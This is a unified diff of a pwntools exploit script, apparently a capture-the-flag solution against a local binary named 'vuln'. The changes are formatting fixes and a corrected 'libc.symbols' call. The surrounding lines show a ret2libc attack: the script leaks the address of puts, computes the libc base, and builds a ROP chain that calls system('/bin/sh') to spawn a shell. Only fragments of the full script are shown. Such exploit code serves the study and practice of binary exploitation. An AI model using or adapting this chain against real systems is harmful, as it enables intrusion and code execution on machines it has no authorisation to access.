@@ -1,6 +1,6 @@
 from pwn import *
 
-context(os = 'linux', arch ='amd64')
+context(os='linux', arch='amd64')
 
 r = process("./vuln")
 
@@ -21,11 +21,11 @@ r.recvline()
 r.sendline(stageI)
 r.recvline()
 
-leaked_puts = r.recvline()[:8].strip().ljust(8,"\x00")
+leaked_puts = r.recvline()[:8].strip().ljust(8, "\x00")
 log.success("Leaked puts@GLIBCL: "+str(leaked_puts))
 leaked_puts = u64(leaked_puts)
 
-libc.address = leaked_puts - libc.symbol['puts']
+libc.address = leaked_puts - libc.symbols['puts']
 rop2 = ROP(libc)
 rop2.system(next(libc.search('/bin/sh\x00')))
 log.info("Stage II ROP Chain:\n" + rop2.dump())
